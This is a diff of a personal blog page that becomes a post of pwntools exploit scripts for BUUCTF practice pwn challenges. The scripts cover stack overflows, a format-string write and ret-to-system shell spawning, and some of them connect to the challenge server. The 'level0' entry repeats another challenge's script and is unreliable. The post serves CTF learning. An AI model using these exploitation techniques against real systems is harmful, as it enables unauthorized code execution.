@@ -130,10 +130,10 @@
   <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
 
   <!-- ga & ba script hoook -->
-  <link rel="canonical" href="https://leo021017.github.io/tags/汇编/">
+  <link rel="canonical" href="https://leo021017.github.io/Lab/BUUCTF/pwn-exp/">
   <title>
     
-      Leo&#39;s Blog
+      BUUCTF PWN Exp - Leo&#39;s Blog
     
   </title>
 <meta name="generator" content="Hexo 5.4.0"></head>
@@ -306,19 +306,19 @@
     .body--light {
       /* intro-header */
       --intro-header-background-image-url-home: url('/img/header_img/myBKG.jpg');
-      --intro-header-background-image-url-post: url('');
-      --intro-header-background-image-url-page: url('/img/header_img/archive_bg2.jpg');
+      --intro-header-background-image-url-post: url('/img/header_img/lml_bg.jpg');
+      --intro-header-background-image-url-page: url('//img/header_img/lml_bg.jpg');
     }
     .body--dark {
       --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/myBKG.jpg');
-      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('');
-      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/archive_bg2.jpg');
+      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/lml_bg.jpg');
+      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('//img/header_img/lml_bg.jpg');
     }
 
     header.intro-header {
-       /*page*/
-        background-image: var(--intro-header-background-image-url-page);
-        /* background-image: url('/img/header_img/archive_bg2.jpg'); */
+       /*post*/
+        background-image: var(--intro-header-background-image-url-post);
+        /* background-image: url('/img/header_img/lml_bg.jpg'); */
       
     }
 
@@ -340,10 +340,36 @@
       <div class="row">
         <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
           
-          <div class="site-heading">
-            <h1>Leo&#39;s Blog</h1>
-            <!--<hr class="small">-->
-            <span class="subheading">这里是知识的荒漠</span>
+          <div class="post-heading">
+            <div class="tags">
+              
+              <a class="tag" href="/tags/#PWN" title="PWN">PWN</a>
+              
+            </div>
+            <h1>BUUCTF PWN Exp</h1>
+            <h2 class="subheading"></h2>
+            <span class="meta">
+              Posted by Leo on
+              2023-11-29
+            </span>
+
+
+            
+            <!-- WordCount start -->
+            <div class="blank_box"></div>
+            <span class="meta">
+              Estimated Reading Time <span class="post-count">2</span> Minutes
+            </span>
+            <div class="blank_box"></div>
+            <span class="meta">
+              Words <span class="post-count">496</span> In Total
+            </span>
+            <div class="blank_box"></div>
+            <!-- WordCount end -->
+            
+            
+
+
           </div>
           
         </div>
@@ -384,494 +410,216 @@
 	Friends Blog、
 	anchorjs、
 	) -->
-		<!-- Main Content -->
-<div class="container">
-  <div class="row">
-    
+		<!-- Modify by Yu-Hsuan Yen -->
+<!-- Post Content -->
+<article>
+  <div class="container">
+    <div class="row">
+      <!-- Post Container -->
+      <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-    <!-- USE SIDEBAR -->
-    <!-- Post Container -->
-    <div class="
-                col-lg-8 col-lg-offset-1
-                col-md-8 col-md-offset-1
-                col-sm-12
-                col-xs-12
-                post-container
-            ">
+        <h2 id="test-your-nc">test_your_nc</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh=remote(&#x27;node4.buuoj.cn&#x27;, 25291)</span></span><br><span class="line">sh = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="rip">rip</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh=remote(&#x27;node4.buuoj.cn&#x27;, 25291)</span></span><br><span class="line">sh = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x000000000040118A</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>-<span class="number">1</span>) + p64(ret_addr) </span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="warmup-csaw-2016">warmup_csaw_2016</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh=remote(&#x27;node4.buuoj.cn&#x27;, 25291)</span></span><br><span class="line">sh = process(<span class="string">&#x27;./warmup_csaw_2016&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x0000000000400611</span> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">8</span>) + p64(ret_addr) </span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ciscn-2019-n-1">ciscn_2019_n_1</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26378</span>)</span><br><span class="line"><span class="comment"># sh = process(&#x27;./ciscn_2019_n_1&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">float_to_hex_bytes</span>(<span class="params">f</span>):</span></span><br><span class="line">    <span class="comment"># 将浮点数打包成单精度浮点数的字节序列</span></span><br><span class="line">    b = struct.pack(<span class="string">&#x27;f&#x27;</span>, f)</span><br><span class="line">    <span class="comment"># 将字节序列转换成十六进制字符串</span></span><br><span class="line">    hex_str = b.<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> hex_str</span><br><span class="line">ans = <span class="number">11.28125</span></span><br><span class="line">ans = float_to_hex_bytes(ans)</span><br><span class="line">ans = <span class="number">0x41348000</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span> + p64(ans) </span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="pwn1-sctf-2016">pwn1_sctf_2016</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29648</span>)</span><br><span class="line"><span class="comment"># sh = process(&#x27;./pwn1_sctf_2016&#x27;)</span></span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x08048F13</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(ret_addr) </span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="level0">level0</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh=remote(&#x27;node4.buuoj.cn&#x27;, 29648)</span></span><br><span class="line">sh = process(<span class="string">&#x27;./pwn1_sctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x08048F13</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(ret_addr) </span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="第五空间2019-决赛-PWN5">[第五空间2019 决赛]PWN5</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27050</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">bssaddr = <span class="number">0x804C044</span></span><br><span class="line"><span class="comment"># payload = p32(bssaddr) +p32(bssaddr+1) +p32(bssaddr+2) +p32(bssaddr+3)+ b&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line"><span class="comment"># payload = p32(0x0804c044) + b&#x27;%10$n&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;MMM%12$n&#x27;</span> + p32(<span class="number">0x0804c044</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;passwd&#x27;</span>)</span><br><span class="line"><span class="comment"># sh.sendline(str(0x10101010))</span></span><br><span class="line"><span class="comment"># sh.sendline(&#x27;4&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="jarvisoj-level2">jarvisoj_level2</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29765</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x0804A024</span></span><br><span class="line">system_addr = <span class="number">0x08048320</span></span><br><span class="line"><span class="comment"># system_addr = elf.symbols[&#x27;system&#x27;]</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(system_addr) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ciscn-2019-n-8">ciscn_2019_n_8</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = remote(&quot;node3.buuoj.cn&quot;,29772)</span></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = (b&#x27;a&#x27;*(13*4) + p64(17))</span></span><br><span class="line"><span class="comment"># payload = (b&#x27;a&#x27;*(13*4) + p32(17) + p32(0))</span></span><br><span class="line"><span class="comment"># payload = p32(17)*14</span></span><br><span class="line">payload = p32(<span class="number">17</span>)*<span class="number">14</span> + p32(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-      <!-- Main Content -->
-<div class="container">
-  <div class="row">
-    <div class="col-lg-8 col-lg-offset-0 col-md-10 col-md-offset-1">
-      <!-- 归档列表 -->
 
-      
-
-      <!-- 归档列表 -->
-      
-      <div class="one-tag-list">
-        <span class="fa fa-calendar-times-o listing-seperator" id="2023">
-          <span class="tag-text">2023</span>
-        </span>
-        <ul>
+        <hr>
+        <!-- Pager -->
+        <ul class="pager">
           
-          <li>
-            11-29
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/Lab/BUUCTF/pwn-exp/" style="color: #0085a1">
-              <span>
-                BUUCTF PWN Exp
-                
-                -- Lab
-                
-              </span>
-            </a>
-          </li>
           
-          <li>
-            11-29
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/Lab/BUUCTF/pwn-wp/" style="color: #0085a1">
-              <span>
-                BUUCTF PWN Write up
-                
-                -- Lab
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            11-26
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/course/pwn/" style="color: #0085a1">
-              <span>
-                PWN入门
-                
-                -- course
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            11-25
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/course/ComputerNetwork/proxy/" style="color: #0085a1">
-              <span>
-                代理服务器原理（https, socks5）
-                
-                -- course
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            11-25
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/other/一些配置/" style="color: #0085a1">
-              <span>
-                一些工具的配置方法
-                
-                -- other
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            11-19
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/course/ComputerNetwork/TLS/" style="color: #0085a1">
-              <span>
-                TLS协商过程
-                
-                -- course
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            11-19
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/other/深信服认证/" style="color: #0085a1">
-              <span>
-                深信服认证题目摘要
-                
-                -- other
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            10-18
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/course/ComputerNetwork/port-scan/" style="color: #0085a1">
-              <span>
-                端口扫描的几种方式
-                
-                -- course
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            10-17
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/course/Assembly/汇编/" style="color: #0085a1">
-              <span>
-                汇编语言程序设计（by fzy）笔记
-                
-                -- course
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            10-17
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/Lab/CSAPP/lab0/" style="color: #0085a1">
-              <span>
-                CSAPP-Lab0
-                
-                -- Lab
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            10-17
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/Lab/Top-Down/Programming/" style="color: #0085a1">
-              <span>
-                自顶向下编程练习
-                
-                -- Lab
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            10-09
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/course/DSA/Pointer/" style="color: #0085a1">
-              <span>
-                指针学习笔记
-                
-                -- course
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            09-23
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/Lab/CSAPP/lab2-bomb/" style="color: #0085a1">
-              <span>
-                CSAPP-Lab2
-                
-                -- Lab
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            09-16
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/RNN/RNN/" style="color: #0085a1">
-              <span>
-                循环神经网络
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            09-16
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/DL基础知识/" style="color: #0085a1">
-              <span>
-                深度学习的一些基础知识
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            09-13
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/GNN/GNN/" style="color: #0085a1">
-              <span>
-                图神经网络
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            07-31
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/CNN/Transformer/" style="color: #0085a1">
-              <span>
-                Transformer
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            07-25
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/Transformer/Swing Transformer/" style="color: #0085a1">
-              <span>
-                Swin Transformer
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            07-24
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/Transformer/self-attention/" style="color: #0085a1">
-              <span>
-                自注意力机制
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            07-24
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/Transformer/Transformer/" style="color: #0085a1">
-              <span>
-                Transformer
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            07-23
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/CNN/EfficientNet/" style="color: #0085a1">
-              <span>
-                EfficientNet
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            07-23
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/Lab/report/" style="color: #0085a1">
-              <span>
-                实训2报告
-                
-                -- Lab
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            07-21
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/CNN/classic CNN/" style="color: #0085a1">
-              <span>
-                经典卷积网络
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            07-07
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/CNN/CNN intro/" style="color: #0085a1">
-              <span>
-                卷积神经网络概述
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            06-28
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/course/OS/os/" style="color: #0085a1">
-              <span>
-                操作系统期末复习
-                
-                -- course
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            06-28
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/other/firstBlog/" style="color: #0085a1">
-              <span>
-                第一篇博客——杂谈
-                
-                -- other
-                
-              </span>
-            </a>
+          <li class="next">
+            <a href="/Lab/BUUCTF/pwn-wp/" data-toggle="tooltip" data-placement="top" title="BUUCTF PWN Write up">Next Post &rarr;</a>
           </li>
           
         </ul>
-      </div>
-      
-    </div>
-  </div>
+
+        
+        <!-- tip start -->
+        <!-- tip -->
+<!-- tip start -->
+<div class="tip">
+  <p>
+    
+      本着互联网开源的性质，欢迎分享这篇文章，以帮助到更多的人，谢谢！
+    
+  </p>
 </div>
+<!-- tip end -->
 
+        <!-- tip end -->
+        
 
-      <!-- 如果开启评论功能 -->
-      
-    </div>
+        
+        <!-- Sharing Srtart -->
+        <!--
+ * @Author: Leo
+ * @Date: 2023-06-26 15:50:28
+ * @LastEditTime: 2023-06-28 23:04:59
+ * @FilePath: \MyBlog\themes\livemylife\layout\_partial\socialshare.ejs
+ * @Description: Leo的一些没用的代码
+-->
+<!-- Social Social Share Post -->
+<!-- Docs:https://github.com/overtrue/share.js -->
 
-    <!-- Sidebar Container -->
-<div class="
-    col-lg-3 col-lg-offset-0
-    col-md-3 col-md-offset-0
-    col-sm-12
-    col-xs-12
-    sidebar-container
-">
-    
-        <!-- Short About -->
-<section class="visible-md visible-lg">
-  <h5><a href="/about/">ABOUT ME</a></h5>
-  <div class="short-about">
-
-    
-    <img id="avatar_pic" src="/img/avatar/myAvatar.jpg" alt="avatar_pic" style="box-shadow: 5px 5px 10px 5px rgba(0, 0, 0, .5);
-    -moz-box-shadow: 5px 5px 10px 5px rgba(0, 0, 0, .5);
-    -webkit-box-shadow: 5px 5px 10px 5px rgba(0, 0, 0, .5);" />
-    
-
-    
-    <p>四川大学 网络空间安全学院</p>
-    
-
-    <!-- SNS Link -->
-    <ul class="list-inline">
-      
-
-      
-      <li>
-        <a target="_blank" href="https://github.com/Leo021017">
-          <span class="fa-stack fa-lg">
-            <i class="fa fa-circle fa-stack-2x"></i>
-            <i class="fa fa-github fa-stack-1x fa-inverse"></i>
-          </span>
-        </a>
-      </li>
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-    </ul>
-  </div>
-</section>
-
-        <hr>
-    
-        <!-- RECENT POSTS -->
-
-<h5><a href="/">RECENT POSTS</a></h5>
-<div class="widget">
-  <ul>
-    
-    <a href="../../Lab/BUUCTF/pwn-exp/">
-      <li>BUUCTF PWN Exp</li>
-    </a>
-    
-    <a href="../../Lab/BUUCTF/pwn-wp/">
-      <li>BUUCTF PWN Write up</li>
-    </a>
-    
-    <a href="../../course/pwn/">
-      <li>PWN入门</li>
-    </a>
-    
-    <a href="../../course/ComputerNetwork/proxy/">
-      <li>代理服务器原理（https, socks5）</li>
-    </a>
-    
-    <a href="../../other/%E4%B8%80%E4%BA%9B%E9%85%8D%E7%BD%AE/">
-      <li>一些工具的配置方法</li>
-    </a>
-    
+<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
+  <ul class="list-inline text-center social-share-ul">
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-twitter">
+        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a class="social-share-icon icon-wechat">
+        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <!-- <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-weibo">
+        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
+      </a>
+    </li> -->
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-qq">
+        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <!-- <li class="social-share-li">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=BUUCTF PWN Exp&body=Hi,I found this website and thought you might like it https://leo021017.github.io/Lab/BUUCTF/pwn-exp/">
+        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
+      </a>
+    </li> -->
   </ul>
 </div>
 
+<!-- css & js -->
+<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
+<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
 
-        <hr>
+        <!-- Sharing End -->
+        
+        <!-- <hr> -->
+
+        <!-- comments start -->
+        <!-- 1. gitalk comment -->
+
+
+<!-- 2. gitment comment -->
+
+
+<!-- 3. disqus comment -->
+
+
+        <!-- comments end -->
+        <!-- <hr> -->
+
+      </div>
+
+      <!-- Catalog: Tabe of Content -->
+      <!-- Table of Contents -->
+
     
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#test-your-nc"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">test_your_nc</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#rip"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">rip</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#warmup-csaw-2016"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">warmup_csaw_2016</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ciscn-2019-n-1"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">ciscn_2019_n_1</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#pwn1-sctf-2016"><span class="toc-nav-number">5.</span> <span class="toc-nav-text">pwn1_sctf_2016</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#level0"><span class="toc-nav-number">6.</span> <span class="toc-nav-text">level0</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="toc-nav-number">7.</span> <span class="toc-nav-text">[第五空间2019 决赛]PWN5</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#jarvisoj-level2"><span class="toc-nav-number">8.</span> <span class="toc-nav-text">jarvisoj_level2</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ciscn-2019-n-8"><span class="toc-nav-number">9.</span> <span class="toc-nav-text">ciscn_2019_n_8</span></a></li></ol>
+        
+        </div>
+      </aside>
+    
+
+
+
+      <!-- Sidebar Container -->
+      <div class="
+                col-lg-8 col-lg-offset-1
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+        <!-- Featured Tags -->
+        
+
         <!-- Friends Blog -->
-
-<h5><a href="/">FRIENDS</a></h5>
-<ul class="list-inline">
-  
-  <li><a href="https://ciyuxionly.github.io" target="_blank">ZLX</a></li>
-  
-</ul>
-
-
+        
         <hr>
-    
-</div>
+        <h5>FRIENDS</h5>
+        <ul class="list-inline">
 
-
-    
+          
+          <li>
+            <a href="https://ciyuxionly.github.io" target="_blank">ZLX</a>
+          </li>
+          
+        </ul>
+        
+      </div>
+    </div>
   </div>
-</div>
+</article>
+
+
+
+<!-- anchorjs start -->
+<!-- async load function -->
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script type="text/javascript">
+  // async load function
+  function async (u, c) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
